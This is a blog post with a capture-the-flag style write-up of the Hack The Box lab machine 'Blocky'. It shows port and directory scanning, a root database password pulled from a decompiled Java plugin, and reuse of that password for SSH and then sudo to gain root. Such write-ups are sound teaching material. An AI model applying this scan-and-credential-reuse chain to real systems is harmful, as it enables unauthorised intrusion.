<!DOCTYPE html>
<html lang="en">

<head>
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  
  <meta charset="utf-8">

  <!-- mobile responsive meta -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Hack The Box - Blocky</title>
  <meta name='description' content='Experienced IT veteran, techie blogging about Hack The Box, Vmware ESXI, Docker, Security and more.'>

  <link rel="canonical" href="https://blckbrdsec.com/2020/02/04/HTB-Blocky/">
  <link rel="alternate" type="application/rss+xml" title="Blckbrd Sec" href="/feed.xml">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Lora:400,400i,700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Mono&display=swap" rel="stylesheet">

  <!-- Main Stylesheet -->
  <link href="/assets/css/main.css" rel="stylesheet">
  
  <!-- Icons -->
  <link rel="stylesheet" href="/assets/fonts/icomoon/style.css">

</head>


<body>

  
    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-154457990-1', 'auto');
  ga('send', 'pageview');
</script>
  

  <div class="container-full">
  <!-- begin header -->
  <header class="header">

    <div class="logo">
      <a class="logo__link" href="/">
      
        Blckbrd Sec
      
      </a>
    </div>

    <nav class="main-nav">
      <span class="main-nav__open">menu</span>

      <div class="main-nav__box">
        <span class="main-nav__close">Close</span>

        <ul class="nav__list list-reset">
          <li class="nav__item">
            <a href="/" class="nav__link">Home</a>
          </li>
          
            
          
            
          
            
          
            
          
            
          
          <li class="nav__item">
            <a href="/tools/" class="nav__link">Tools</a>
          </li>
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>

      </div>

    </nav>

  </header>
  <!-- end header -->
</div>


  <!-- begin content -->
  <main class="content" aria-label="Content">
    <div class="container">
  <!-- begin post -->
  <article class="post">
    <div class="post__head" data-aos="fade-up" data-aos-easing="ease-out-quad" data-aos-duration="700">
      <h1 class="post__title">Hack The Box - Blocky</h1>
      <div class="post__date">
        <time datetime="2020-02-04T13:10:00+01:00">Published Feb 04, 2020</time>
      </div>
      
      <div class="post-image img-blur" style="background-image: url(/assets/img/blocky.png)"></div>
      
    </div>

    <div class="post__content" data-aos="fade-up" data-aos-easing="ease-out-quad" data-aos-delay="100" data-aos-duration="700">
      <p>Write-up for retired machine “Blocky” on <a href="https://hackthebox.eu" target="_blank">hackthebox.eu</a>. Its a machine running Linux with IP adress: <strong>10.10.10.37</strong>. 
<!--more-->
Lets start by running a NMAP scan and see what ports are open.</p>

<h2 id="informatie-gathering">Informatie gathering</h2>

<p><a href="https://www.explainshell.com/explain?cmd=nmap+-T4+-A+-p-+-v+10.10.10.37" target="_blank">nmap -T4 -A -p- -v 10.10.10.37</a></p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-02-01 17:00 EST
NSE: Loaded 151 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
Initiating NSE at 17:00
Completed NSE at 17:00, 0.00s elapsed
Initiating Ping Scan at 17:00
Scanning 10.10.10.37 <span class="o">[</span>2 ports]
Completed Ping Scan at 17:00, 0.04s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 17:00
Completed Parallel DNS resolution of 1 host. at 17:00, 1.01s elapsed
Initiating Connect Scan at 17:00
Scanning 10.10.10.37 <span class="o">[</span>65535 ports]
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Connect Scan Timing: About 24.15% <span class="k">done</span><span class="p">;</span> ETC: 17:02 <span class="o">(</span>0:01:37 remaining<span class="o">)</span>
Discovered open port 25565/tcp on 10.10.10.37
Connect Scan Timing: About 60.37% <span class="k">done</span><span class="p">;</span> ETC: 17:02 <span class="o">(</span>0:00:40 remaining<span class="o">)</span>
Completed Connect Scan at 17:02, 95.86s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Initiating Service scan at 17:02
Scanning 4 services on 10.10.10.37
Completed Service scan at 17:02, 6.08s elapsed <span class="o">(</span>4 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.10.37.
Initiating NSE at 17:02
Completed NSE at 17:02, 2.07s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 0.16s elapsed
Initiating NSE at 17:02
Completed NSE at 17:02, 0.00s elapsed
Nmap scan report <span class="k">for </span>10.10.10.37
Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65530 filtered ports
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open   http      Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: WordPress 4.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: BlockyCraft &amp;#8211<span class="p">;</span> Under Construction!
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 <span class="o">(</span>Protocol: 127, Message: A Minecraft Server, Users: 0/20<span class="o">)</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre></figure>

<p>With the NMAP scan we found de following open ports.</p>
<ul>
  <li>21 FTP</li>
  <li>22 SSH</li>
  <li>80 Apache webserver</li>
</ul>

<p>When we visit 10.10.10.37 in Firefox we get a blockycraft, under construction website.
As we look closer at the page source head section we can see its made with Wordpress 4.8.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"generator"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"WordPress 4.8"</span> /&gt;</code></pre></figure>

<p><img src="/assets/img/wordpress.png" alt="Wordpress page" /></p>

<p>There is not much to see exept a single blogpost made by user “Notch”.</p>

<p>Lets run Gobuster(can be installed in kali itself; apt install gobuster) to look for more directories.
I used dirbusters medium wordlist for this search.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.37 <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.10.10.37
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/02/01 15:46:50 Starting gobuster
<span class="o">===============================================================</span>
/wiki <span class="o">(</span>Status: 301<span class="o">)</span>
/wp-content <span class="o">(</span>Status: 301<span class="o">)</span>
/plugins <span class="o">(</span>Status: 301<span class="o">)</span>
/wp-includes <span class="o">(</span>Status: 301<span class="o">)</span>
/javascript <span class="o">(</span>Status: 301<span class="o">)</span>
/wp-admin <span class="o">(</span>Status: 301<span class="o">)</span>
/phpmyadmin <span class="o">(</span>Status: 301<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
<span class="o">===============================================================</span>
2020/02/01 15:58:45 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>Out of the list above i’ve found /wiki to be under construction, /plugins had some .jar files to download, /phpmyadmin default login page which we don’t have a login yet.</p>

<p>I downloaded the BlockyCore.jar file from the plugins dir and unzipped the contents. Then I used jd-gui(also downloadable inside kali) to explore the BlockyCore.class file and we see credentials of some kind.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">package com.myfirstplugin<span class="p">;</span>

public class BlockyCore <span class="o">{</span>
  public String sqlHost <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
  public String sqlUser <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
  public String sqlPass <span class="o">=</span> <span class="s2">"8YsqfCTnvxAUeduzjNSXe22"</span><span class="p">;</span></code></pre></figure>

<h2 id="exploitation">Exploitation</h2>

<p>Tried user and pass on both phpmyadmin and Wordpress admin page with to no avail.</p>

<p>So lets try something else since ssh port 22 is open.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh root@10.10.10.37
root@10.10.10.37<span class="s1">'s password: &lt;paste&gt;
Permission denied, please try again.</span></code></pre></figure>

<p>Lets try the notch user from the Wordpress blogpost.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ssh notch@10.10.10.37
notch@10.10.10.37<span class="s1">'s password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Feb  2 08:09:14 2020 from 10.10.14.20
notch@Blocky:~$ ls -l
total 8
drwxrwxr-x 7 notch notch 4096 Jul  2  2017 minecraft
-r-------- 1 notch notch   32 Jul  2  2017 user.txt
notch@Blocky:~$ </span></code></pre></figure>

<p>And we own user. User.txt can be found in the root of user notch.</p>

<p>After running <a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a> on the box i’ve found out notch is part of the sudo group.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+] We<span class="s1">'re a member of the (lxd) group - could possibly misuse these rights!
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span></code></pre></figure>

<p>sudo su gives us access to the root account, its’ that simple.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">notch@Blocky:~<span class="nv">$ </span><span class="nb">sudo </span>su
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>notch: 
root@Blocky:/home/notch# <span class="nb">ls</span> <span class="nt">-l</span> /root/
total 4
<span class="nt">-r--------</span> 1 root root 32 Jul  2  2017 root.txt
root@Blocky:/home/notch# </code></pre></figure>


    </div>

    
    <div class="post-tags">
      
      <a href="/tag/hackthebox" class="post-tags__tag">hackthebox</a>
      
      <a href="/tag/blocky" class="post-tags__tag">blocky</a>
      
      <a href="/tag/linenum" class="post-tags__tag">linenum</a>
      
      <a href="/tag/linux" class="post-tags__tag">linux</a>
      
      <a href="/tag/minecraft" class="post-tags__tag">minecraft</a>
      
      <a href="/tag/wordpress" class="post-tags__tag">wordpress</a>
      
    </div>
    

    <div class="post__share">
      <ul class="share__list list-reset">
        <li class="share__item">
          <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://blckbrdsec.com/2020/02/04/HTB-Blocky/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m40.43 21.739h-7.645v-5.014c0-1.883 1.248-2.322 2.127-2.322h5.395v-8.278l-7.43-.029c-8.248 0-10.125 6.174-10.125 10.125v5.518h-4.77v8.53h4.77v24.137h10.033s0-13.32 0-24.137h6.77z"/></svg>
            </a>
        </li>

        <li class="share__item">
          <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Blocky&url=https://blckbrdsec.com/2020/02/04/HTB-Blocky/"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m52.837 15.065c-1.811.805-3.76 1.348-5.805 1.591 2.088-1.25 3.689-3.23 4.444-5.592-1.953 1.159-4.115 2-6.418 2.454-1.843-1.964-4.47-3.192-7.377-3.192-5.581 0-10.106 4.525-10.106 10.107 0 .791.089 1.562.262 2.303-8.4-.422-15.848-4.445-20.833-10.56-.87 1.492-1.368 3.228-1.368 5.082 0 3.506 1.784 6.6 4.496 8.412-1.656-.053-3.215-.508-4.578-1.265-.001.042-.001.085-.001.128 0 4.896 3.484 8.98 8.108 9.91-.848.23-1.741.354-2.663.354-.652 0-1.285-.063-1.902-.182 1.287 4.015 5.019 6.938 9.441 7.019-3.459 2.711-7.816 4.327-12.552 4.327-.815 0-1.62-.048-2.411-.142 4.474 2.869 9.786 4.541 15.493 4.541 18.591 0 28.756-15.4 28.756-28.756 0-.438-.009-.875-.028-1.309 1.974-1.422 3.688-3.203 5.042-5.23z"/></svg>
            </a>
        </li>

        <li class="share__item">
          <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://blckbrdsec.com/2020/02/04/HTB-Blocky/&amp;media=https://blckbrdsec.com/assets/img/blocky.png&amp;description=Hack%20The%20Box%20-%20Blocky"
            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow">
              <svg enable-background="new 0 0 56.693 56.693" height="56.693" viewBox="0 0 56.693 56.693" width="56.693" xmlns="http://www.w3.org/2000/svg"><path d="m28.348 5.158c-13.599 0-24.625 11.023-24.625 24.625 0 10.082 6.063 18.744 14.739 22.553-.069-1.721-.012-3.783.429-5.654.473-2 3.168-13.418 3.168-13.418s-.787-1.572-.787-3.896c0-3.648 2.115-6.373 4.749-6.373 2.24 0 3.322 1.682 3.322 3.695 0 2.252-1.437 5.619-2.175 8.738-.616 2.613 1.31 4.744 3.887 4.744 4.665 0 7.808-5.992 7.808-13.092 0-5.397-3.635-9.437-10.246-9.437-7.47 0-12.123 5.57-12.123 11.792 0 2.146.633 3.658 1.624 4.83.455.537.519.754.354 1.371-.118.453-.389 1.545-.501 1.977-.164.625-.669.848-1.233.617-3.44-1.404-5.043-5.172-5.043-9.408 0-6.994 5.899-15.382 17.599-15.382 9.4 0 15.588 6.804 15.588 14.107 0 9.658-5.369 16.875-13.285 16.875-2.659 0-5.16-1.438-6.016-3.068 0 0-1.43 5.674-1.732 6.768-.522 1.9-1.545 3.797-2.479 5.275 2.215.654 4.554 1.01 6.979 1.01 13.598 0 24.623-11.023 24.623-24.623-.001-13.603-11.027-24.626-24.624-24.626z"/></svg>
            </a>
        </li>
      </ul>
    </div>

    <div class="post__navigation">
      
      <a class="prev" href="/2019/12/30/zenmap-kali-2019-4/">
        <div class="prev__post-icon">
          <svg enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><path d="m352 128.4-32.3-32.4-159.7 160 159.7 160 32.3-32.4-127.3-127.6z"/></svg>
        </div>
        <span class="post__nav-wrapper">
          <div class="post__nav-image" style="background-image: url(/assets/img/zen.png)"></div>
          <h2 class="post__nav-title"><time datetime="2020-02-04T13:10:00+01:00">Feb 04, 2020</time> <br>Install Zenmap - Kali Linux 2019.4</h2>
        </span>
      </a>
      

      
    </div>

    
      <div class="show-comments">
  <button class="disqus-button" id="show-comments-button" onclick="disqus();return false;">Leave a comment</button>
</div>

<div id="disqus_thread"></div>

<script>
var disqus_loaded = false;
var disqus_shortname = 'blckbrdsec'; // Add your shortname here
function disqus() {
  if (!disqus_loaded)  {
      disqus_loaded = true;
      var e = document.createElement("script");
      e.type = "text/javascript";
      e.async = true;
      e.src = "//" + disqus_shortname + ".disqus.com/embed.js";
      (document.getElementsByTagName("head")[0] ||
      document.getElementsByTagName("body")[0])
      .appendChild(e);
      // Hide the button after opening
      document.getElementById("show-comments-button").style.display = "none";
  }
}
</script>
<noscript>Please enable JavaScript to view the
  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>

    

  </article>
  <!-- end post -->
</div>

  </main>
  <!-- end content -->

  <div class="container">
  <!-- begin footer -->
  <footer class="footer">
    <div class="footer__inner">
      <div class="contact">
        <span> 
            <script>document.write(new Date().getFullYear());
            </script> - <a href="https://blckbrdsec.com" target="_blank">www.blckbrdsec.com</a><br><br>
        </span>
        <ul class="contact__list list-reset">
  <li class="contact__item">
    <a href="https://twitter.com/blckbrdsec" class="contact__link" target="_blank" rel="noopener" title="Twitter"><span class="contact__icon icon-twitter"></span></a>
  </li>
  <li class="contact__item">
    <a href="https://github.com/blckbrd" class="contact__link" target="_blank" rel="noopener" title="Github"><span class="contact__icon icon-github"></span></a>
  </li>
</ul>

      </div>
    </div>
  </footer>
  <!-- end footer -->
</div>


  <!-- begin js -->
  <script src="/assets/js/vendors/jquery-3.3.1.min.js"></script>
  <script src="/assets/js/vendors/aos.js"></script>
  <script src="/assets/js/vendors/jquery.fitvids.js"></script>
  <script src="/assets/js/common.js"></script>
  <!-- end js -->
</body>

</html>
